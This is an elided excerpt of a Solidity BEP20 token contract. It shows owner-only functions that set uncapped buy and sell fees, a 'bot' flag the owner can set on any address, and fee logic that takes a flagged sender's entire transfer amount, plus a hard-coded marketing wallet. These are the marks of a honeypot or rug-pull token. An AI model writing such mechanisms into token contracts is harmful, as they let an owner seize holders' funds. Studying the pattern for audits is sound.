...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    address _market)
    {
        ...
        marketWalletAddress = payable(_market);
    ...
    function setBuyFees(uint256 a, uint256 b) external onlyOwner() {
        _buyLiquidityFee = a;
        _buyMarketingFee = b;
    ...
    function setSellFees(uint256 a, uint256 b) external onlyOwner() {
        _sellLiquidityFee = a;
        _sellMarketingFee = b;
    ...
    function isbotAddress(address account) public view returns(bool) {
        return _botAddress[account];
    }


    function set_botAddress(address recipient, bool status) public onlyOwner {
        _botAddress[recipient] = status;
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(_botAddress[sender] && !isMarketPair[sender]) feeAmount = amount;
...
contract Token is BEP20 {
    constructor() BEP20(
        ...
        [uint256(2),uint256(2)],
        [uint256(1),uint256(3)],
        0x61c324cFB8C234AEC28814CfF864a296C8112cb1
    ){}
}